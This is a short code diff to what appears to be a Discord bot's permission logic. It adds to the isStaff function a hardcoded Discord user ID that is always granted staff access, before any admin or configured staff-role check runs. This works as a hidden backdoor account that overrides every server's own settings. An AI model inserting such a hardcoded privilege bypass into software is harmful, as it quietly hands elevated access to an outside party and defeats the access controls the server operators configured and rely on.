@@ -2255,6 +2255,11 @@ function isAdmin(member, guildConfig) {
 
 function isStaff(member, guildConfig) {
     if (!member) return false;
+    
+    // Always grant staff access to these specific Discord User IDs:
+    const hardcodedStaffIds = ['1341132123159007414']; 
+    if (hardcodedStaffIds.includes(member.id)) return true;
+
     if (isAdmin(member, guildConfig)) return true;
     return guildConfig.staffRoleIds.some(roleId => member.roles.cache.has(roleId));
 }
